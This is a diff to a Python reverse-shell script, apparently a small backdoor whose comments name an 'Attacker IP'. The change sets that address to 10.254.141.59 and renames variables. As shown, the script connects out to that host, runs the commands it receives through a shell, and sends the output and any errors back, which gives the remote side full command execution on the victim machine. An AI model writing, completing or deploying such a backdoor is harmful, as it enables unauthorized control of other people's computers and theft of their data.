@@ -2,7 +2,7 @@ import socket                                               # For starting TCP c
 import subprocess                                           # To start the shell in the system
 
 # Attacker IP goes here
-ATT_IP = ""
+ATT_IP = "10.254.141.59"
 
 def connect():
     # Creating object soketi
@@ -21,9 +21,9 @@ def connect():
 
         else:                                               # else pass command to shell.
 
-            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            CMD = subprocess.Popen(komandi, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             
-            socket.send(CMD.stdout.read())                  # send back the result
+            soketi.send(CMD.stdout.read())                  # send back the result
 
             # send back the error -if any-, such as syntax error
             soketi.send(CMD.stderr.read())
